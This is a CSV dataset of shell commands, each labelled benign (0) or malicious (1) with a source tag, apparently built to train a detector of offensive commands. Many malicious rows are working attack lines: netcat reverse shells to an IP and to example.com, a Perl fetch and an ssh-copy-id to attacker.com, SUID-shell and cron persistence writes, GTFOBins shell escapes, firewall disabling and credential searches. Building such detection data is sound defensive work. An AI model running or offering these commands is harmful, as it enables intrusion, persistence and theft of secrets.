id,command,label,source,split
d1_012208,aur search keyword,0,tldr,train
d1_012209,tre [-V|--version],0,tldr,train
d1_012210,find . | xargs md5sum,0,nl2bash,train
d1_012211,cp -p auth.tar.gz modules/,0,bash_instruct,train
d1_012212,compseq -sequence path/to/input_rna.fasta -word 3 path/to/output_file.comp -nozero -frame 3,0,tldr,train
d1_012213,haproxy -f haproxy.cfg,0,linlm,train
d1_012214,"find //.azure -name ""msal_token_cache.json"" -o -name ""accessTokens.json"" -type f 2>/dev/null",1,atomic_red_team,train
d1_012216,cat response.md | sort | uniq,0,bash_instruct,train
d1_012217,rails db:rollback,0,tldr,train
d1_012218,cal -d 0..6,0,tldr,train
d1_012219,sudo nethogs device,0,tldr,train
d1_012220,beet list query,0,tldr,train
d1_012221,"(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v ""^#"" | grep -Pv ""\W*\#"" 2>/dev/null)",1,hacktricks,train
d1_012222,du -hs /path/to/directory,0,nl2bash,train
d1_012223,sed 's/inactive/7.98.246.159/g' build.log,0,bash_instruct,train
d1_012224,sudo journalctl --vacuum-time=2weeks,0,linlm,train
d1_012226,tor --client,0,tldr,train
d1_012228,find . -type f -executable -exec sed -i 's/foo/bar/g' {} +,0,nl2bash,train
d1_012230,rsync -av releases/ bin/,0,bash_instruct,train
d1_012231,micromamba run [-p|--prefix] /path/to/env pytest tests/,0,tldr,train
d1_012232,echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit,1,hacktricks,train
d1_012233,wg genkey | tee privatekey | wg pubkey > publickey,0,linlm,train
d1_012234,chsh --shell /bin/bash nobody,1,atomic_red_team,train
d1_012235,cat data.csv | sort -u,0,bash_instruct,train
d1_012236,echo $(echo $ENCODED) | xxd -r -p,1,atomic_red_team,train
d1_012238,cat users.ini | sort -u,0,bash_instruct,train
d1_012239,gcal --starting-day=1,0,tldr,train
d1_012241,kubectl annotate [po|pods] pod_name key=value,0,tldr,train
d1_012243,"date -d ""Oct 21 1973"" +%s",0,nl2bash,train
d1_012244,cp [-vr|--verbose --recursive] path/to/source_directory path/to/target_directory,0,tldr,train
d1_012245,sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng,1,hacktricks,train
d1_012246,stat settings.js,0,bash_instruct,train
d1_012247,"echo ""ExecStart=/bin/bash -c ""whoami > /tmp/atomic_shm_output.txt"""" >> /dev/shm/atomic_shm.service",1,atomic_red_team,train
d1_012248,jhead -dsft path/to/image.jpg,0,tldr,train
d1_012249,shelly aur search search_term,0,tldr,train
d1_012251,local t=assert(s.tcp());,1,gtfobins,train
d1_012252,react-native run-android,0,tldr,train
d1_012253,capsh --decode=00000000a80425fb,1,hacktricks,train
d1_012254,xxd /path/to/input-file | xxd -r,1,gtfobins,train
d1_012255,cat data.json | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_012256,ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com,1,gtfobins,train
d1_012257,ls -lh scripts,0,bash_instruct,train
d1_012258,find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null,1,slp,train
d1_012259,jira issue [ls|list],0,tldr,train
d1_012261,pamcomp [-ali|-align] left|center|right|beyondleft|beyondright [-x|-xoff] x_offset path/to/overlay.pam path/to/underlay.pam > path/to/output.pam,0,tldr,train
d1_012262,numactl --membind=0 --cpunodebind=0 python3 script.py,0,linlm,train
d1_012263,unamestr=$(uname),1,atomic_red_team,train
d1_012264,sudo htpdate -s host,0,tldr,train
d1_012265,aws s3 presign help,0,tldr,train
d1_012266,security-checker security:check path/to/composer.lock,0,tldr,train
d1_012267,ip -d link,1,hacktricks,train
d1_012269,find / -type f -size 0 -exec ls -l {} \;,0,nl2bash,train
d1_012270,grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status,1,hacktricks,train
d1_012273,firejail /bin/sh,1,gtfobins,train
d1_012274,echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config,1,gtfobins,train
d1_012275,sort -n numbers.txt,0,linlm,train
d1_012276,sudo ebpfmon,1,hacktricks,train
d1_012277,lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true,1,hacktricks,train
d1_012278,pgmtexture -d distance path/to/image.pgm > path/to/output.pgm,0,tldr,train
d1_012279,strings -a ./candidate | head -n 50,1,hacktricks,train
d1_012281,cat users.conf | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_012283,"node -e 'const fs=require(""fs""); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync(""/"").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'",1,hacktricks,train
d1_012285,head -n 1 metrics.yaml,0,bash_instruct,train
d1_012286,airdecap-ng -w hex_key path/to/capture.cap,0,tldr,train
d1_012287,echo x | xargs -o -a /dev/null /bin/sh -p,1,gtfobins,train
d1_012288,find . -xdev -print0 | cpio -oa0V | gzip > path_to_save.cpio.gz,0,nl2bash,train
d1_012289,cat customer.txt | sort -u,0,bash_instruct,train
d1_012290,ls [-ltr|-lt --reverse],0,tldr,train
d1_012291,ps aux # | grep -i nc | grep -vi grep,1,payloads,train
d1_012292,xxd -l 64 catalog.tar.gz,0,bash_instruct,train
d1_012293,sudo yum update -y,0,bash6k,train
d1_012295,/tmp/unknown 2>/dev/null || true,1,hacktricks,train
d1_012296,fold -w130 file | ...,0,nl2bash,train
d1_012297,sesearch --type_transition -s staff_t 2>/dev/null | head,1,hacktricks,train
d1_012299,sort -nr profile.txt,0,bash_instruct,train
d1_012300,sudo pactrans local/package_to_remove repository_name/package_to_install,0,tldr,train
d1_012301,distrobox-host-exec ls,0,tldr,train
d1_012302,find cache -type f -print0 | xargs -0 chmod 644,0,bash_instruct,train
d1_012303,"alias unix=""date +%s""",0,nl2bash,train
d1_012304,cat server.csv | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_012305,"sed -n '10,20p' customer.log",0,bash_instruct,train
d1_012307,mount --bind / /tmp/host,1,hacktricks,train
d1_012308,cabal exec --project-file=/dev/null -- /bin/sh -p,1,gtfobins,train
d1_012309,gzip -k messages,0,bash_instruct,train
d1_012310,micro path/to/file,0,tldr,train
d1_012311,find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null,1,hacktricks,train
d1_012312,makepkg,0,linlm,train
d1_012313,cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot,1,hacktricks,train
d1_012314,cd /home/www && find . -type f -print0 | xargs -0 perl -i.bak -pe 's/subdomainA\.example\.com/subdomainB.example.com/g',0,nl2bash,train
d1_012315,pveam [a|available] --section system|turnkeylinux|mail,0,tldr,train
d1_012318,calc help,0,tldr,train
d1_012319,nmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap,1,payloads,train
d1_012320,journalctl -u elasticsearch --since '1 days ago',0,bash_instruct,train
d1_012321,pdftotext input.pdf output.txt,0,linlm,train
d1_012322,head -n -500 request.log,0,bash_instruct,train
d1_012324,wc -c test.txt,0,bash6k,train
d1_012326,ls -l /host/root/userns_marker 2>/dev/null,1,hacktricks,train
d1_012327,add-apt-repository [-s|--enable-source] repository_spec,0,tldr,train
d1_012328,/usr/bin/passwd -S root 2>/dev/null,1,hacktricks,train
d1_012329,"find /path -type f -name ""*txt"" -printf ""cp '%p' '/tmp/test_%f'\n"" | bash",0,nl2bash,train
d1_012330,cat /sys/class/graphics/fb0/virtual_size,1,hacktricks,train
d1_012331,tldr musescore,0,tldr,train
d1_012333,crane append [-b|--base] image_name,0,tldr,train
d1_012335,opencode web [-h|--help],0,tldr,train
d1_012336,cat metrics.md | wc -l,0,bash_instruct,train
d1_012337,gphoto2 [-D|--delete-all-files],0,tldr,train
d1_012338,tr -d '0-9' < summary.ini,0,bash_instruct,train
d1_012339,collectd -f,0,tldr,train
d1_012341,distcc /bin/sh,1,gtfobins,train
d1_012342,mv *.tmp cache/,0,bash_instruct,train
d1_012344,scrub path/to/file,0,tldr,train
d1_012346,python -m pytest,0,linlm,train
d1_012348,fuser path/to/file_or_directory,0,tldr,train
d1_012350,ranger --show-only-dirs,0,tldr,train
d1_012351,for p in /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe /proc/sysrq-trigger /proc/kmsg /proc/kallsyms /proc/kcore /proc/sched_debug /proc/1/mountinfo /proc/config.gz; do,1,hacktricks,train
d1_012352,sshpass -d 0 ssh user@hostname,0,tldr,train
d1_012353,luanti --server --world world_name,0,tldr,train
d1_012354,grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null,1,hacktricks,train
d1_012356,sudo chown -R jenkins:docker docs,0,bash_instruct,train
d1_012357,"perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>""attacker.com"",PeerPort=>80,Proto=>""tcp"") or die; print $s ""GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n""; open(my $fh, "">"", ""/path/to/output-file"") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq ""\r\n"") { $in_content = 1; } } close($s); close($fh);'",1,gtfobins,train
d1_012358,PASS=$(openssl rand -base64 12),0,bash6k,train
d1_012359,EXEC_ID=$(,1,hacktricks,train
d1_012360,tar -czf - backup | ssh git@app01.service.io 'cat > /backup/backup.tar.gz',0,bash_instruct,train
d1_012361,chmod go-w debug.py,0,bash_instruct,train
d1_012362,"vibe --output json|text|streaming [-p|--prompt] ""your_prompt""",0,tldr,train
d1_012363,konsole,0,linlm,train
d1_012364,"sed 's/\t/,/g' data.yaml > data.yaml.csv",0,bash_instruct,train
d1_012365,du -s --block-size=M /path/to/your/directory/,0,nl2bash,train
d1_012366,yum install http://hdedf5e56.example.net/path/to/input-file.rpm,1,gtfobins,train
d1_012367,ip -s link show,0,linlm,train
d1_012368,ln -s settings.txt latest.log,0,bash_instruct,train
d1_012369,pnmremap [-ma|-mapfile] path/to/palette_file.ppm [-fi|-firstisdefault] path/to/input.pnm > path/to/output.pnm,0,tldr,train
d1_012370,vsce unpublish extension_id,0,tldr,train
d1_012371,dmsetup ls --exec '/bin/sh -s',1,gtfobins,train
d1_012372,nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty',1,gtfobins,train
d1_012373,sqlite3 /dev/null '.shell /bin/sh',1,gtfobins,train
d1_012374,find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50,1,hacktricks,train
d1_012375,tar -czf - build | ssh bob@db01.service.io 'cat > /backup/build.tar.gz',0,bash_instruct,train
d1_012376,pngcrush -rem allb -brute -reduce in.png out.png,0,tldr,train
d1_012377,openssl dgst -sign private_key_file -sha256 -sigopt rsa_padding_mode:pss -out output_file input_file,0,tldr,train
d1_012378,busctl status htb.oouch.Block,1,hacktricks,train
d1_012379,find / -perm -4000 -type f 2>/dev/null,1,hacktricks,train
d1_012380,yay -S boostnote,0,linlm,train
d1_012382,rustup toolchain install toolchain,0,tldr,train
d1_012383,du -h /usr/local/bin/* | sort -rh | head -n 10,0,bash_instruct,train
d1_012385,hashid [-o|--outfile] path/to/output.txt hash,0,tldr,train
d1_012386,aws ecr list-images --repository-name repository,0,tldr,train
d1_012387,kubectl completion bash >> ~/.bashrc,0,tldr,train
d1_012388,"lighthouse --only-categories=performance,accessibility,best-practices,seo,pwa https://h0caaf24a.example.net",0,tldr,train
d1_012390,sed e,1,gtfobins,train
d1_012392,npm diff,0,tldr,train
d1_012393,tldr time,0,tldr,train
d1_012394,"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog""",1,atomic_red_team,train
d1_012396,sudo pacman -S helix,0,linlm,train
d1_012397,cat >/path/to/temp-file.conf <<EOF,1,gtfobins,train
d1_012398,sudo chown tomcat dump.js,0,bash_instruct,train
d1_012400,haveged -v,0,linlm,train
d1_012401,ssh -p 9090 git@staging.corp.net,0,bash_instruct,train
d1_012402,docker logs -f container_name,0,linlm,train
d1_012403,tail -n 20 dump.sh,0,bash_instruct,train
d1_012405,grep -i error server.log | sort -u,0,bash_instruct,train
d1_012407,"find . -name "".txt"" | grep a",0,nl2bash,train
d1_012408,streamlink --hls-live-restart example.com/stream best,0,tldr,train
d1_012409,cpio -o --rsh-command /bin/sh -F localhost:,1,gtfobins,train
d1_012411,coffee path/to/file.coffee,0,tldr,train
d1_012413,head -n 1 schema.sh,0,bash_instruct,train
d1_012414,ssh -i id_rsa host,0,nl2bash,train
d1_012415,ytmdl [-o|--output-dir] path/to/directory song_name,0,tldr,train
d1_012417,cat event.json | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_012418,cp server.txt include/,0,bash_instruct,train
d1_012420,chmod 644 invoice.yaml,0,bash_instruct,train
d1_012421,find /foo/bar -name '*.mp4' -print0 | xargs -I{} -0 mv -t /some/path {},0,nl2bash,train
d1_012422,ppmntsc path/to/input_file.ppm > path/to/output_file.ppm,0,tldr,train
d1_012423,rpcmap.py -brute-uuids stringbinding,0,tldr,train
d1_012424,du -sh * | sort -h,0,bash6k,train
d1_012425,echo '...' >Vagrantfile,1,gtfobins,train
d1_012427,gzcat large.csv.gz | split -l 1000 - xxx,0,nl2bash,train
d1_012428,script /dev/null -c bash,1,hacktricks,train
d1_012429,"grep -RE 'comm=""su""|comm=""sudo""' /var/log* 2>/dev/null",1,hacktricks,train
d1_012430,cat server.txt | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_012431,ufw disable,1,atomic_red_team,train
d1_012432,echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded,1,atomic_red_team,train
d1_012433,doctl [d|databases] [o|options] [eng|engines],0,tldr,train
d1_012434,sudo systemctl enable --now openvpn-server@server,0,linlm,train
d1_012435,jj tag [d|delete] tag_name,0,tldr,train
d1_012436,timew track start_time - end_time activity_tag,0,tldr,train
d1_012437,find . -type f -exec sed -i 's/foo/bar/g' {} +,0,nl2bash,train
d1_012438,[ -w /proc/sys/kernel/core_pattern ] || exit 1,1,hacktricks,train
d1_012439,pkill -u carol,0,bash_instruct,train
d1_012440,mkdir -p $HOME/ContainerImages/alpine/,1,hacktricks,train
d1_012441,uptime >> /tmp/T1082.txt,1,atomic_red_team,train
d1_012442,gcloud iam service-accounts add-iam-policy-binding service_account_email --member member --role role,0,tldr,train
d1_012443,gst-launch-1.0 source ! pipewiresink client-name=node_name,0,tldr,train
d1_012445,sudo semanage import [-f|--input_file] path/to/file,0,tldr,train
d1_012447,mv *.pdf cache/,0,bash_instruct,train
d1_012448,smalltalkci --smalltalk Squeak64-Trunk,0,tldr,train
d1_012449,alias cd-='cd $(history -p !!:1)',0,nl2bash,train
d1_012451,cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20,1,hacktricks,train
d1_012452,mv changelog.json changelog.json.old,0,bash_instruct,train
d1_012453,file inventory.csv,0,bash_instruct,train
d1_012454,Get-NodeVersions -Remote,0,tldr,train
d1_012456,git revert 0c01a9,0,tldr,train
d1_012457,"echo 'import os' > /tmp/f.v && echo 'fn main() { os.system(""nc -e /bin/dash 175.227.113.26 8888 0>&1"") }' >> /tmp/f.v && v run /tmp/f.v && rm /tmp/f.v",1,quasarnix,train
d1_012458,find -ls,0,nl2bash,train
d1_012459,npm team rm organization:team username,0,tldr,train
d1_012460,cppcheck --enable error|warning|style|performance|portability|information|all path/to/file.cpp,0,tldr,train
d1_012461,poetry add dependency,0,tldr,train
d1_012462,cat manifest.csv | sort -u,0,bash_instruct,train
d1_012463,find trunk -type f -exec curl --user user:pass --ftp-create-dirs -T {} https://h4a89a28c.example.net/{} \;,0,nl2bash,train
d1_012464,nc -e /bin/sh example.com 4242,1,slp,train
d1_012466,find . -name '*.java' -newer build.xml -print,0,nl2bash,train
d1_012467,gist file.txt file2.txt,0,tldr,train
d1_012468,[ -f build.xml ] && cat build.xml || echo 'not found',0,bash_instruct,train
d1_012469,ltrace [-o|--output] file path/to/program,0,tldr,train
d1_012470,pg_recvlogical [-d|--dbname] dbname [-S|--slot] slot_name --create-slot [-t|--enable-two-phase],0,tldr,train
d1_012472,ffmpeg -i path/to/input_audio.flac -ar 44100 -sample_fmt s16 path/to/output_audio.wav,0,tldr,train
d1_012473,debugfs: dump /tmp/asd1.txt /tmp/asd2.txt,1,hacktricks,train
d1_012475,setsid [-f|--fork] program,0,tldr,train
d1_012476,getconf CHILD_MAX,0,tldr,train
d1_012477,kioclient --help,0,tldr,train
d1_012478,apptainer run --env variable=value path/to/image.sif,0,tldr,train
d1_012480,cat dump.md | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_012481,cat /etc/inetd.conf /etc/xinetd.conf,1,hacktricks,train
d1_012482,evil-winrm [-i|--ip] ip_address [-u|--user] user [-p|--password] password [-S|--ssl] [-c|--pub-key] path/to/pubkey [-k|--priv-key] path/to/privkey,0,tldr,train
d1_012483,cat sales.yaml | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_012484,systemctl start ipmidrv,0,tldr,train
d1_012485,ls -d /var/www/*/,0,bash_instruct,train
d1_012486,xcaddy build --with module_name,0,tldr,train
d1_012487,fastboot flash recovery path/to/file.img,0,tldr,train
d1_012488,xxd -l 64 credentials.conf,0,bash_instruct,train
d1_012489,uv init --directory path/to/directory project_name,0,tldr,train
d1_012490,tr -s ' ' < sales.yaml,0,bash_instruct,train
d1_012491,groupdel examplegroup,0,bash6k,train
d1_012492,terraform init -input=false,0,tldr,train
d1_012493,kate [-h|--help],0,tldr,train
d1_012494,"cut -d, -f1 nginx-error.log | sort | uniq -c | sort -nr | head -n 10",0,bash_instruct,train
d1_012495,wall file,0,tldr,train
d1_012496,pandoc -L /path/to/temp-file /dev/null,1,gtfobins,train
d1_012497,./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force,1,atomic_red_team,train
d1_012498,head /proc/12345/root/dev/sdb,1,hacktricks,train
d1_012499,xset s off,0,tldr,train
d1_012500,grep -v 'DEBUG' build.log,0,bash_instruct,train
d1_012501,cat /etc/hostname /etc/hosts /etc/resolv.conf,1,hacktricks,train
d1_012502,find . -perm 600 -print | xargs chmod 666,0,nl2bash,train
d1_012503,buku [-u|--update] bookmark_id --tag - search engine,0,tldr,train
d1_012507,plocate */filename,0,tldr,train
d1_012509,spf [--fch|--fix-config-file],0,tldr,train
d1_012510,printf 'HELP\r\n' | nc 76.132.177.92 4444,1,hacktricks,train
d1_012512,cat <<'EOF' > /tmp/h,1,hacktricks,train
d1_012513,yum install ffmpeg-2.6.4-1.fc22.x86_64.rpm,0,nl2bash,train
d1_012514,sqlfluff lint [-d|--dialect] dialect path/to/file_or_directory,0,tldr,train
d1_012515,"mail < path/to/file.txt --subject ""$HOSTNAME filename.txt"" to_user@example.com",0,tldr,train
d1_012516,cp -p settings.html data/,0,bash_instruct,train
d1_012518,ocaml path/to/file.ml,0,tldr,train
d1_012519,unrtf --latex path/to/file.rtf,0,tldr,train
d1_012520,solo monitor path/to/serial_port,0,tldr,train
d1_012521,conntrack -C,0,linlm,train
d1_012524,kubectl proxy --api-prefix /custom_prefix/,0,tldr,train
d1_012525,"find /volume1/uploads -name ""*.mkv"" -exec /tmp/rename.sh \{\} \;",0,nl2bash,train
d1_012526,(find /boot | sed s'/^/STDOUT:/' ) 3>&1 1>&2 2>&3 | sed 's/^/STDERR:/',0,nl2bash,train
d1_012529,secure-no-suid-fixup: no (unlocked),1,hacktricks,train
d1_012530,"echo -ne ""\033]0;My Session\007""",0,bash6k,train
d1_012532,cp response.html response.html.bak,0,bash_instruct,train
d1_012533,pct [del|delsnapshot] 100 snapshot_name,0,tldr,train
d1_012534,tree -s,0,nl2bash,train
d1_012537,cp -p build.tmp dist/,0,bash_instruct,train
d1_012539,"find root -name '*.rmv' -type f -exec cp --parents ""{}"" /copy/to/here \;",0,nl2bash,train
d1_012540,"paste -sd """" file.txt",0,nl2bash,train
d1_012541,cat error.json | grep -v '^$',0,bash_instruct,train
d1_012542,wc -l config.txt,0,bash_instruct,train
d1_012543,vue init webpack|webpack-simple|browserify|browserify-simple|simple project_name,0,tldr,train
d1_012544,2024/02/01 22:02:14 CMD: UID=0 PID=17887 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new,1,hacktricks,train
d1_012546,ss -lntp | egrep '4565|830|8443',1,hacktricks,train
d1_012547,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' session.conf | sort -u,0,bash_instruct,train
d1_012548,python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey,1,hacktricks,train
d1_012550,ksh -n path/to/script.ksh,0,tldr,train
d1_012551,terraform plan -refresh-only,0,tldr,train
d1_012552,stat customer.png,0,bash_instruct,train
d1_012553,tar -czf - static | ssh dave@staging.service.io 'cat > /backup/static.tar.gz',0,bash_instruct,train
d1_012554,bluetoothctl devices,0,bash6k,train
d1_012555,sed '/^$/d' credentials.ini,0,bash_instruct,train
d1_012556,"aws ssm list-command-invocations --instance-id ""instance_id""",0,tldr,train
d1_012557,podman rmi [-f|--force] image,0,tldr,train
d1_012558,"find ""$HOME"" -name '*.txt' -type f -print0 | xargs -0 cp -ut ""$HOME/newdir""",0,nl2bash,train
d1_012559,shell /bin/sh,1,gtfobins,train
d1_012561,pulumi stack [hist|history] [-j|--json],0,tldr,train
d1_012562,cat payment.tsv | grep -v '^$',0,bash_instruct,train
d1_012564,http [-a|--auth] username:password|token [-A|--auth-type] basic|digest|bearer GET|POST|... https://h0caaf24a.example.net/auth,0,tldr,train
d1_012565,hg branch branch_name,0,tldr,train
d1_012566,cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r),1,hacktricks,train
d1_012567,"sed -n '10,20p' notes.md",0,bash_instruct,train
d1_012568,openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12,1,hacktricks,train
d1_012570,"command | ts ""%b %d %H:%M:%.S""",0,tldr,train
d1_012571,nix-channel --update,0,tldr,train
d1_012572,mount /dev/sda1 /mnt/,1,gtfobins,train
d1_012575,"find ""`pwd`"" -type f",0,nl2bash,train
d1_012576,sort -nr schema.txt,0,bash_instruct,train
d1_012577,!number,0,tldr,train
d1_012578,rm -f ~/.android/adbkey ~/.android/adbkey.pub,0,nl2bash,train
d1_012579,find bin -type f -printf '%s %p\n' 2>/dev/null | sort -rn | head -n 5,0,bash_instruct,train
d1_012580,pkill metricbeat,0,linlm,train
d1_012583,pacman -S package_name,0,linlm,train
d1_012584,numactl --preferred=1 python3 script.py,0,linlm,train
d1_012585,cat credentials.tsv | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_012586,pdftocairo path/to/file.pdf output.pdf -pdf -expand,0,tldr,train
d1_012587,sudo chown operator auth.sql,0,bash_instruct,train
d1_012589,wikit topic -d,0,tldr,train
d1_012590,python3.11 -m venv venv,0,bash6k,train
d1_012591,sudo mmcli --modem=modem --messaging-list-sms,0,tldr,train
d1_012592,ln -s results.jpg latest.log,0,bash_instruct,train
d1_012594,cat account.ini | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_012595,"journalctl _UID=0 --output=json-pretty --since ""1 hour ago""",1,hacktricks,train
d1_012596,terraform apply -var-file path/to/file.tfvars,0,tldr,train
d1_012597,tldr argos-translate,0,tldr,train
d1_012598,arduino-builder -build-options-file path/to/build.options.json,0,tldr,train
d1_012599,find /var/www/html -type d -perm 777 -print -exec chmod 755 {} \;,0,nl2bash,train
d1_012600,pnmremap [-ma|-mapfile] path/to/palette_file.ppm [-fs|-floyd] path/to/input.pnm > path/to/output.pnm,0,tldr,train
d1_012601,yaa archive -d path/to/directory -o path/to/output_file.yaa,0,tldr,train
d1_012602,dict [-D|--dbs],0,tldr,train
d1_012603,chmod 777 sda,1,hacktricks,train
d1_012604,"find ""/tmp/2/"" -iname ""$j.sh"" -exec cp {} ""$i"" \;",0,nl2bash,train
d1_012605,pnmtorast -standard|rle path/to/input.pnm > path/to/output.rast,0,tldr,train
d1_012607,command | sed -fg path/to/script.sed,0,tldr,train
d1_012608,sudo pacman -S luarocks,0,linlm,train
d1_012609,ssh-keyscan 138.204.192.16,1,hacktricks,train
d1_012610,"grep -rho ""^[[:space:]]*[^/][^[:space:]]*"" src/*.js | wc -l",0,bash6k,train
d1_012612,sort -u migration.yaml,0,bash_instruct,train
d1_012613,"echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" > /etc/cron.monthly/persistevil",1,atomic_red_team,train
d1_012616,gh pr checks pr_number,0,tldr,train
d1_012617,find . -depth -type f -print,0,nl2bash,train
d1_012619,dig +time=2 +tries=1 @65.150.41.161 google.com A,1,hacktricks,train
d1_012620,lwp-request file:///path/to/input-file,1,gtfobins,train
d1_012621,az image delete [-n|--name] name [-g|--resource-group] resource_group,0,tldr,train
d1_012622,cat dbdump.sql.gz | gzip -cd | mysql,0,nl2bash,train
d1_012623,cat debug.conf | tail -n 15,0,bash_instruct,train
d1_012624,keyctl pipe key_name,0,tldr,train
d1_012625,echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | b64decode -r,1,atomic_red_team,train
d1_012626,filebeat reload,0,linlm,train
d1_012627,find * -type f -print -o -type d -prune,0,nl2bash,train
d1_012628,realpath path/to/file_or_directory,0,tldr,train
d1_012629,find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;,1,slp,train
d1_012630,ansible-galaxy role init role_name,0,tldr,train
d1_012631,rustup target remove --toolchain toolchain target,0,tldr,train
d1_012633,"big_lines=`cat foo.txt | grep -c ""$expression""`",0,nl2bash,train
d1_012634,cat /sys/class/power_supply/BAT0/temp,0,linlm,train
d1_012635,exo compute sks nodepool add cluster_name|id nodepool_name --size 3 [-z|--zone] zone,0,tldr,train
d1_012637,conda clean [-a|--all],0,tldr,train
d1_012638,reflex -- echo {},0,tldr,train
d1_012639,tar -czf - tmp | ssh www-data@registry.example.org 'cat > /backup/tmp.tar.gz',0,bash_instruct,train
d1_012640,else: import urllib as r,1,gtfobins,train
d1_012641,"STAGE_URL=$(curl -s -X POST -d ""echo Simulated host discovery output"" ""https://h99122e9f.example.net"")",1,atomic_red_team,train
d1_012642,pstree -p www-data,0,bash_instruct,train
d1_012643,"for f in *.log; do gzip ""$f""; done",0,bash6k,train
d1_012644,find /tmp/ -type f -mtime +1 -delete,0,nl2bash,train
d1_012646,"sed 's/\t/,/g' report.txt > report.txt.csv",0,bash_instruct,train
d1_012647,"while IFS=',' read -r ts user count rest; do",1,hacktricks,train
d1_012648,dnsrecon [-d|--domain] example.com -g [-c|--csv],0,tldr,train
d1_012649,"Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip",1,hacktricks,train
d1_012650,find . — type f -exec ls -1 {} \;,0,nl2bash,train
d1_012651,tifftopnm [-r|-respectfillorder] path/to/input_file.tiff > path/to/output_file.pnm,0,tldr,train
d1_012652,mv index.tmp index.tmp.old,0,bash_instruct,train
d1_012653,"find / -type f -name ""*.txt"" -print | xargs rm",0,nl2bash,train
d1_012654,sudo pacman -U path/to/package1.pkg.tar.zst path/to/package2.pkg.tar.zst ...,0,tldr,train
d1_012655,cat /sys/fs/cgroup/cgroup.subtree_control,1,hacktricks,train
d1_012657,mkdir -p /mnt/hostdisk,1,hacktricks,train
d1_012659,"if test -f ""path/to/file""; then echo ""File exists""; else echo ""File does not exist""; fi",0,tldr,train
d1_012660,jj resolve [-l|--list],0,tldr,train
